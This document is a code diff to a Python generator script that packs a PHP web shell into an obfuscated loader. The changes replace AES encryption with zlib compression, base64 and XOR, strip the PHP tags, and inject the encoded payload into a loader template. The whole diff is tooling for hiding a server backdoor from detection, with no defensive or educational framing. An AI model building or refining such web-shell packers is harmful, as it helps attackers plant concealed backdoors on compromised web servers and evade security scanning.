@@ -3,33 +3,26 @@ import os
 import base64
 import secrets
 import hashlib
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.backends import default_backend
+import zlib
 
 def encrypt_shell(shell_content, key):
-    """Encrypt the shell content using AES-256-CBC with SHA256 hash of key"""
-    # Generate IV from the key
-    iv = hashlib.md5(key.encode()).digest()[:16]
+    """Encrypt the shell content using a simple but effective method"""
+    # First, compress the content to reduce size and add some obfuscation
+    compressed = zlib.compress(shell_content.encode('utf-8'))
     
-    # Hash the key (as we found Method 4 works)
-    key_hash = hashlib.sha256(key.encode()).digest()
+    # Base64 encode the compressed content
+    encoded = base64.b64encode(compressed).decode('utf-8')
     
-    # Pad the content
-    padder = padding.PKCS7(algorithms.AES.block_size).padder()
-    padded_data = padder.update(shell_content.encode()) + padder.finalize()
+    # Simple XOR encryption with the key
+    key_bytes = hashlib.sha256(key.encode()).digest()
+    encrypted = []
     
-    # Encrypt the content
-    cipher = Cipher(
-        algorithms.AES(key_hash), 
-        modes.CBC(iv),
-        backend=default_backend()
-    )
-    encryptor = cipher.encryptor()
-    encrypted_content = encryptor.update(padded_data) + encryptor.finalize()
+    for i, char in enumerate(encoded):
+        key_char = key_bytes[i % len(key_bytes)]
+        encrypted.append(chr(ord(char) ^ key_char))
     
-    # Return base64 encoded encrypted content
-    return base64.b64encode(encrypted_content).decode()
+    # Return the final encrypted string
+    return base64.b64encode(''.join(encrypted).encode('utf-8')).decode('utf-8')
 
 def generate_shell(main_shell_path, loader_template_path, output_path):
     """Generate the final shell with encrypted payload"""
@@ -37,11 +30,20 @@ def generate_shell(main_shell_path, loader_template_path, output_path):
     key = secrets.token_hex(8)
     
     # Read the main shell content
-    with open(main_shell_path, 'r') as f:
+    with open(main_shell_path, 'r', encoding='utf-8') as f:
         main_shell = f.read()
     
+    # Remove PHP opening tag if present
+    main_shell = main_shell.strip()
+    if main_shell.startswith('<?php'):
+        main_shell = main_shell[5:].strip()
+    
+    # Remove PHP closing tag if present
+    if main_shell.endswith('?>'):
+        main_shell = main_shell[:-2].strip()
+    
     # Read the loader template
-    with open(loader_template_path, 'r') as f:
+    with open(loader_template_path, 'r', encoding='utf-8') as f:
         loader_template = f.read()
     
     # Encrypt the main shell
@@ -52,7 +54,7 @@ def generate_shell(main_shell_path, loader_template_path, output_path):
     final_loader = final_loader.replace('$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER"', f'$payload = "{encrypted_shell}"')
     
     # Write the final shell to the output path
-    with open(output_path, 'w') as f:
+    with open(output_path, 'w', encoding='utf-8') as f:
         f.write(final_loader)
     
     print(f"Shell generated successfully at {output_path}")
